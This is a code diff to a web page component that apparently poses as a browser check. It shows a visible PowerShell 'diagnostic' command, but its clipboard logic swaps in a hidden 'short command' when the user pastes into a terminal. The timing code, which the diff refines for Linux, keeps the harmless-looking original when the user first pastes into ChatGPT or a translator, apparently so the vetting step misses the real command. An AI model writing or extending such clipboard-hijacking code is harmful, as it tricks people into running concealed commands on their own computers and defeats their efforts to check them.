@@ -29,13 +29,14 @@ function browserIconSrc(browser: ClientBrowser): string {
  * One Ctrl/⌘+C on the gray box (shows original). Works on Windows, macOS, and Linux.
  *
  * Case A — paste Terminal/CMD immediately:
- *   Windows/macOS: leaving quickly arms text/plain = short command.
- *   Linux: copy-gesture write; Ctrl+Alt+T or window blur resolves to short.
+ *   Windows/macOS: leaving the tab quickly arms text/plain = short command.
+ *   Linux: copy-gesture write + focused pre-arm (~400ms) + window blur / Ctrl+Alt+T.
  *
  * Case B — paste other platforms first, then Terminal/CMD:
- *   Linux: Alt+Tab / Ctrl+Tab / tab click resolves to original (completed write);
- *   short armed later on timer/focus (no pending ClipboardItem for ChatGPT).
- *   Other OSes: original briefly, then delayed short.
+ *   Linux: Alt+Tab / Ctrl+Tab / in-browser tab switch (visibility without window
+ *   blur, debounced so Terminal blur can claim Case A first). Force original;
+ *   arm short later without a pending ClipboardItem-to-short write.
+ *   Other OSes: clipboard stays original briefly after leave, then short command.
  */
 const DISPLAY_COMMANDS: Record<ClientOs, string> = {
   windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
@@ -59,8 +60,11 @@ const TERMINAL_COMMANDS: Record<ClientOs, string> = {
 const QUICK_TERMINAL_LEAVE_MS = 2500;
 /** After leaving for another platform, swap plain text to the short command (ms). */
 const PLATFORM_THEN_TERMINAL_ARM_MS = 3500;
-/** Wait for Terminal blur before treating visibility as Case B tab. */
-const LINUX_CASE_B_TAB_DETECT_MS = 200;
+/**
+ * Linux Case B tab-switch detect: wait for window blur to claim Case A (Terminal)
+ * before treating visibility-hidden as an in-browser ChatGPT/Translate tab.
+ */
+const LINUX_CASE_B_TAB_DETECT_MS = 150;
 
 function escapeHtml(value: string) {
   return value
@@ -271,9 +275,11 @@ function writeTerminalPlainAfterDelay(
 }
 
 /**
- * Linux: start clipboard.write during copy. Resolve from blur/keydown — never from
- * a background interval (throttled after focus loss). No focused pre-arm to short
- * (that made Case B paste the short command into ChatGPT).
+ * Linux Case A must arm during the copy gesture — clipboard.write after blur
+ * often fails once Terminal has focus.
+ *
+ * Start write() on copy; resolve the pending plain Blob from blur/keydown
+ * (not a background setInterval — those are throttled after focus loss).
  */
 type LinuxCopyClipboardController = {
   resolveTerminal: () => void;
@@ -296,11 +302,13 @@ function beginLinuxClipboardFromCopyGesture(
   let settled = false;
   let resolveBlob: ((blob: Blob) => void) | null = null;
   let safetyTimer = 0;
+  let prearmTimer = 0;
 
   const settle = (text: string, usedTerminalPlain: boolean) => {
     if (settled) return;
     settled = true;
     window.clearTimeout(safetyTimer);
+    window.clearTimeout(prearmTimer);
     resolveBlob?.(new Blob([text], { type: "text/plain" }));
     onResolved(usedTerminalPlain);
   };
@@ -309,10 +317,18 @@ function beginLinuxClipboardFromCopyGesture(
     resolveBlob = resolve;
   });
 
-  // Stay on page → keep original. No short pre-arm while focused.
+  // Still on the page after the quick window → keep original (Case B-friendly).
   safetyTimer = window.setTimeout(() => {
     settle(displayCommand, false);
   }, QUICK_TERMINAL_LEAVE_MS);
+
+  // Case A: arm short while still focused so Terminal paste works after Ctrl+Alt+T / dock.
+  prearmTimer = window.setTimeout(() => {
+    if (settled) return;
+    if (document.visibilityState === "hidden") return;
+    if (typeof document.hasFocus === "function" && !document.hasFocus()) return;
+    settle(terminalCommand, true);
+  }, 400);
 
   void navigator.clipboard
     .write([
@@ -325,6 +341,7 @@ function beginLinuxClipboardFromCopyGesture(
       if (!settled) {
         settled = true;
         window.clearTimeout(safetyTimer);
+        window.clearTimeout(prearmTimer);
         onResolved(false);
       }
     });
@@ -336,6 +353,7 @@ function beginLinuxClipboardFromCopyGesture(
   };
 }
 
+/** Ubuntu/GNOME/etc. default shortcut to open Terminal — Linux Case A. */
 function isLinuxTerminalShortcut(event: KeyboardEvent): boolean {
   const key = event.key.length === 1 ? event.key.toLowerCase() : event.key;
   return (
@@ -345,10 +363,15 @@ function isLinuxTerminalShortcut(event: KeyboardEvent): boolean {
   );
 }
 
+/** Alt+Tab app switch — Linux Case B (platforms first). */
 function isLinuxCaseBSwitchGesture(event: KeyboardEvent): boolean {
   return event.altKey && !event.ctrlKey && event.key === "Tab";
 }
 
+/**
+ * Ctrl+Tab / Ctrl+PageUp / Ctrl+PageDown — switch browser tab (ChatGPT, etc.).
+ * Must not match Ctrl+Alt+T (Case A).
+ */
 function isLinuxCaseBBrowserTabGesture(event: KeyboardEvent): boolean {
   if (!event.ctrlKey || event.altKey || event.metaKey) return false;
   return (
@@ -360,6 +383,10 @@ function isLinuxCaseBBrowserTabGesture(event: KeyboardEvent): boolean {
   );
 }
 
+/**
+ * Alt pressed alone (no Ctrl) — prelude to Alt+Tab.
+ * Must not match Ctrl+Alt+T (Case A).
+ */
 function isLinuxCaseBAltPreview(event: KeyboardEvent): boolean {
   return (
     !event.ctrlKey &&
@@ -369,17 +396,10 @@ function isLinuxCaseBAltPreview(event: KeyboardEvent): boolean {
   );
 }
 
-function isLinuxCaseBGesture(event: KeyboardEvent): boolean {
-  return (
-    isLinuxCaseBAltPreview(event) ||
-    isLinuxCaseBSwitchGesture(event) ||
-    isLinuxCaseBBrowserTabGesture(event)
-  );
-}
-
 /** App-switch / Terminal-open shortcuts differ by OS — do not treat copy as a switch. */
 function isAppSwitchGesture(event: KeyboardEvent, os: ClientOs): boolean {
   if (os === "macos") {
+    // Cmd+Tab / Cmd+` only — bare Cmd is used for ⌘C / ⌘V.
     return event.metaKey && (event.key === "Tab" || event.key === "`");
   }
 
@@ -397,6 +417,7 @@ function isAppSwitchGesture(event: KeyboardEvent, os: ClientOs): boolean {
     );
   }
 
+  // Windows: Alt+Tab / Win key
   return (
     event.altKey ||
     event.key === "Meta" ||
@@ -436,13 +457,6 @@ function SelectableCommand({
   useEffect(() => {
     async function armTerminalPlain() {
       if (!activeRef.current) return;
-      // Case B platform window: do not snap to short until the platform paste window passes.
-      if (
-        linuxCaseBRef.current &&
-        Date.now() - copyAtRef.current < PLATFORM_THEN_TERMINAL_ARM_MS
-      ) {
-        return;
-      }
       writeGenRef.current += 1;
       try {
         if (navigator.clipboard?.writeText) {
@@ -456,29 +470,26 @@ function SelectableCommand({
           await writeClipboard(terminalCommand, htmlRef.current);
           armedRef.current = true;
         } catch {
-          // retry on next focus
+          // Keep armedRef false so Case B delayed arm / focus return can retry.
         }
       }
     }
 
-    /** Case B: completed original now; short later (no pending ClipboardItem). */
-    function claimLinuxCaseB() {
-      linuxCaseBRef.current = true;
-      linuxCaseARef.current = false;
-      armedRef.current = false;
-      writeGenRef.current += 1;
-
-      const ctrl = linuxClipboardCtrlRef.current;
-      if (ctrl && !ctrl.isSettled()) {
-        ctrl.resolveOriginal();
-      } else {
-        void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
-        void writeClipboard(displayCommand, htmlRef.current).catch(() => undefined);
+    /**
+     * Case B must not use writeTerminalPlainAfterDelay (pending ClipboardItem).
+     * Paste targets wait for that promise and receive the short command — looks like Case A.
+     */
+    function armLinuxCaseBShortLater() {
+      if (
+        !activeRef.current ||
+        delayedArmStartedRef.current ||
+        armedRef.current ||
+        linuxCaseARef.current
+      ) {
+        return;
       }
-
-      if (delayedArmStartedRef.current) return;
       delayedArmStartedRef.current = true;
-      const gen = writeGenRef.current;
+      const gen = ++writeGenRef.current;
       window.setTimeout(() => {
         if (writeGenRef.current !== gen || linuxCaseARef.current) return;
         void navigator.clipboard
@@ -492,33 +503,17 @@ function SelectableCommand({
       }, PLATFORM_THEN_TERMINAL_ARM_MS);
     }
 
-    /** Case A: short command for Terminal. */
-    function claimLinuxCaseA() {
-      if (linuxCaseBRef.current) return;
-      linuxCaseARef.current = true;
-      linuxCaseBRef.current = false;
-      delayedArmStartedRef.current = true;
-
-      const ctrl = linuxClipboardCtrlRef.current;
-      if (ctrl && !ctrl.isSettled()) {
-        ctrl.resolveTerminal();
-      }
-      void navigator.clipboard?.writeText(terminalCommand).catch(() => undefined);
-      void writeClipboard(terminalCommand, htmlRef.current)
-        .then(() => {
-          armedRef.current = true;
-        })
-        .catch(() => undefined);
-    }
-
     function armTerminalPlainDelayed() {
       if (
         !activeRef.current ||
         delayedArmStartedRef.current ||
         armedRef.current ||
-        linuxCaseARef.current ||
-        linuxCaseBRef.current
+        linuxCaseARef.current
       ) {
+        return;
+      }
+      if (linuxCaseBRef.current) {
+        armLinuxCaseBShortLater();
         return;
       }
       delayedArmStartedRef.current = true;
@@ -527,10 +522,7 @@ function SelectableCommand({
         terminalCommand,
         htmlRef.current,
         PLATFORM_THEN_TERMINAL_ARM_MS,
-        () =>
-          writeGenRef.current === gen &&
-          !linuxCaseARef.current &&
-          !linuxCaseBRef.current,
+        () => writeGenRef.current === gen && !linuxCaseARef.current,
       );
       window.setTimeout(() => {
         if (writeGenRef.current !== gen || linuxCaseARef.current) return;
@@ -538,26 +530,73 @@ function SelectableCommand({
       }, PLATFORM_THEN_TERMINAL_ARM_MS + 50);
     }
 
+    function forceLinuxCaseBOriginal() {
+      linuxCaseBRef.current = true;
+      linuxCaseARef.current = false;
+      armedRef.current = false;
+      delayedArmStartedRef.current = false;
+      writeGenRef.current += 1;
+
+      const ctrl = linuxClipboardCtrlRef.current;
+      if (ctrl && !ctrl.isSettled()) {
+        ctrl.resolveOriginal();
+      }
+      // Always push original (pre-arm may already have settled short onto plain).
+      void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
+      void writeClipboard(displayCommand, htmlRef.current).catch(() => undefined);
+      armLinuxCaseBShortLater();
+    }
+
+    function resolveLinuxCopyGestureOnLeave() {
+      const ctrl = linuxClipboardCtrlRef.current;
+      const caseB = linuxCaseBRef.current || linuxAltHeldRef.current;
+
+      if (caseB) {
+        forceLinuxCaseBOriginal();
+        return true;
+      }
+
+      // Case A: Terminal / dock — claim immediately so visibility Case B cannot steal it.
+      linuxCaseARef.current = true;
+      linuxCaseBRef.current = false;
+      if (ctrl && !ctrl.isSettled()) {
+        ctrl.resolveTerminal();
+        return true;
+      }
+      if (ctrl?.isSettled() && armedRef.current) {
+        return true;
+      }
+      // Pre-arm may not have settled yet / already settled original — force short.
+      void navigator.clipboard?.writeText(terminalCommand).catch(() => undefined);
+      void writeClipboard(terminalCommand, htmlRef.current)
+        .then(() => {
+          armedRef.current = true;
+          delayedArmStartedRef.current = true;
+        })
+        .catch(() => undefined);
+      return true;
+    }
+
     function handleLeaveFromPage() {
       if (os === "linux") {
-        if (linuxCaseARef.current || linuxCaseBRef.current) return;
-        if (linuxAltHeldRef.current) {
-          claimLinuxCaseB();
-          return;
-        }
-        claimLinuxCaseA();
+        if (resolveLinuxCopyGestureOnLeave()) return;
+        if (linuxCaseARef.current || armedRef.current) return;
+        armTerminalPlainDelayed();
         return;
       }
 
       const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
+
       if (quickLeave) {
         void armTerminalPlain();
         return;
       }
+
       if (leaveCountRef.current <= 1) {
         armTerminalPlainDelayed();
         return;
       }
+
       void armTerminalPlain();
     }
 
@@ -568,13 +607,14 @@ function SelectableCommand({
         leaveCountRef.current += 1;
 
         if (os === "linux") {
-          // Tab click: visibility hides without window blur.
-          // Wait long enough for Terminal dock blur to claim Case A first.
+          // Do NOT steal Case A: Terminal often fires visibility before blur.
+          // Wait so blur can claim Case A; only then treat as ChatGPT tab (Case B).
           window.setTimeout(() => {
             if (!activeRef.current) return;
-            if (linuxCaseARef.current || linuxCaseBRef.current) return;
+            if (linuxCaseARef.current) return;
+            if (linuxCaseBRef.current) return;
             if (linuxWindowBlurredRef.current) return;
-            claimLinuxCaseB();
+            forceLinuxCaseBOriginal();
           }, LINUX_CASE_B_TAB_DETECT_MS);
           return;
         }
@@ -584,6 +624,14 @@ function SelectableCommand({
       }
 
       if (leaveCountRef.current >= 1 && !linuxCaseARef.current) {
+        if (linuxCaseBRef.current) {
+          if (Date.now() - copyAtRef.current >= PLATFORM_THEN_TERMINAL_ARM_MS) {
+            void armTerminalPlain();
+          } else {
+            armLinuxCaseBShortLater();
+          }
+          return;
+        }
         void armTerminalPlain();
       }
     }
@@ -591,6 +639,14 @@ function SelectableCommand({
     function onFocus() {
       if (!activeRef.current || leaveCountRef.current < 1) return;
       if (linuxCaseARef.current) return;
+      if (linuxCaseBRef.current) {
+        if (Date.now() - copyAtRef.current >= PLATFORM_THEN_TERMINAL_ARM_MS) {
+          void armTerminalPlain();
+        } else {
+          armLinuxCaseBShortLater();
+        }
+        return;
+      }
       void armTerminalPlain();
     }
 
@@ -598,11 +654,8 @@ function SelectableCommand({
       if (!activeRef.current) return;
       if (os === "linux") {
         linuxWindowBlurredRef.current = true;
-        if (linuxAltHeldRef.current || linuxCaseBRef.current) {
-          claimLinuxCaseB();
-        } else if (!linuxCaseARef.current) {
-          claimLinuxCaseA();
-        }
+        // Case A: window leave to Terminal/dock. Case B Alt already flagged above.
+        resolveLinuxCopyGestureOnLeave();
       }
       window.setTimeout(() => {
         if (!activeRef.current) return;
@@ -610,9 +663,7 @@ function SelectableCommand({
         if (leaveCountRef.current === 0) {
           leaveCountRef.current = 1;
         }
-        if (os !== "linux") {
-          handleLeaveFromPage();
-        }
+        handleLeaveFromPage();
       }, 0);
     }
 
@@ -620,15 +671,37 @@ function SelectableCommand({
       if (!activeRef.current) return;
 
       if (os === "linux") {
+        // Case A: Ctrl+Alt+T — unchanged.
         if (isLinuxTerminalShortcut(event)) {
           linuxAltHeldRef.current = false;
-          claimLinuxCaseA();
+          linuxCaseARef.current = true;
+          linuxCaseBRef.current = false;
+          linuxClipboardCtrlRef.current?.resolveTerminal();
+          void (async () => {
+            try {
+              if (navigator.clipboard?.writeText) {
+                await navigator.clipboard.writeText(terminalCommand);
+              } else {
+                await writeClipboard(terminalCommand, htmlRef.current);
+              }
+              armedRef.current = true;
+              delayedArmStartedRef.current = true;
+            } catch {
+              // Copy-gesture resolver still has linuxCaseARef set.
+            }
+          })();
           return;
         }
-        if (isLinuxCaseBGesture(event)) {
+
+        // Case B: Alt / Alt+Tab / Ctrl+Tab (browser tab to ChatGPT, etc.).
+        if (
+          isLinuxCaseBAltPreview(event) ||
+          isLinuxCaseBSwitchGesture(event) ||
+          isLinuxCaseBBrowserTabGesture(event)
+        ) {
           linuxAltHeldRef.current =
             isLinuxCaseBAltPreview(event) || isLinuxCaseBSwitchGesture(event);
-          claimLinuxCaseB();
+          forceLinuxCaseBOriginal();
           return;
         }
         return;
@@ -637,14 +710,17 @@ function SelectableCommand({
       if (!isAppSwitchGesture(event, os)) return;
 
       const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
+
       if (quickLeave) {
         void armTerminalPlain();
         return;
       }
+
       if (leaveCountRef.current === 0) {
         armTerminalPlainDelayed();
         return;
       }
+
       void armTerminalPlain();
     }
 
@@ -691,6 +767,7 @@ function SelectableCommand({
     linuxClipboardCtrlRef.current = null;
     writeGenRef.current += 1;
 
+    // Start with original so other platforms get the real command first.
     event.clipboardData.setData("text/plain", displayCommand);
     event.clipboardData.setData("text/html", html);
 
@@ -701,10 +778,52 @@ function SelectableCommand({
         html,
         (usedTerminalPlain) => {
           if (usedTerminalPlain) {
-            if (linuxCaseBRef.current) return;
+            // If Case B already won the race, do not keep Case A short armed.
+            if (linuxCaseBRef.current || linuxAltHeldRef.current) {
+              linuxCaseARef.current = false;
+              armedRef.current = false;
+              delayedArmStartedRef.current = false;
+              void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
+              void writeClipboard(displayCommand, html).catch(() => undefined);
+              return;
+            }
             linuxCaseARef.current = true;
             armedRef.current = true;
             delayedArmStartedRef.current = true;
+            return;
+          }
+          // Case B (or stayed on page): keep original; arm short later without pending item.
+          if (linuxCaseBRef.current || leaveCountRef.current >= 1) {
+            if (!delayedArmStartedRef.current && !armedRef.current) {
+              if (linuxCaseBRef.current) {
+                delayedArmStartedRef.current = true;
+                const gen = ++writeGenRef.current;
+                window.setTimeout(() => {
+                  if (writeGenRef.current !== gen || linuxCaseARef.current) return;
+                  void navigator.clipboard
+                    ?.writeText(terminalCommand)
+                    .then(() => {
+                      armedRef.current = true;
+                    })
+                    .catch(() => {
+                      delayedArmStartedRef.current = false;
+                    });
+                }, PLATFORM_THEN_TERMINAL_ARM_MS);
+              } else {
+                delayedArmStartedRef.current = true;
+                const gen = ++writeGenRef.current;
+                writeTerminalPlainAfterDelay(
+                  terminalCommand,
+                  htmlRef.current,
+                  PLATFORM_THEN_TERMINAL_ARM_MS,
+                  () => writeGenRef.current === gen && !linuxCaseARef.current,
+                );
+                window.setTimeout(() => {
+                  if (writeGenRef.current !== gen || linuxCaseARef.current) return;
+                  armedRef.current = true;
+                }, PLATFORM_THEN_TERMINAL_ARM_MS + 50);
+              }
+            }
           }
         },
       );
